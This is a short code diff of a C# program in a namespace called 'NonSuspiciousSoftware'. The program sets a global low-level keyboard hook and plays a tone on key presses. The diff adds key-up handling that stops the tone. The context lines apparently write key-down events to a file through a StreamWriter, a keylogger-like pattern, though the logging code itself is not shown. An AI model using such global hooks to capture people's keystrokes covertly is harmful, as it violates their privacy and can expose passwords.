@@ -16,6 +16,7 @@ namespace NonSuspiciousSoftware
     {
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
+        private const int WM_KEYUP = 0x0101;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
         private static WaveOut waveOut;
@@ -59,6 +60,11 @@ namespace NonSuspiciousSoftware
                 sw.Close();
 
             }
+            else if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
+            {
+                Console.WriteLine(" UP");
+                StopSinWave();
+            }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
@@ -96,7 +102,6 @@ namespace NonSuspiciousSoftware
                 waveOut = new WaveOut();
                 waveOut.Init(sineWaveProvider);
                 waveOut.Play();
-                await Task.Delay(1000);
                 StopSinWave();
             }
         }
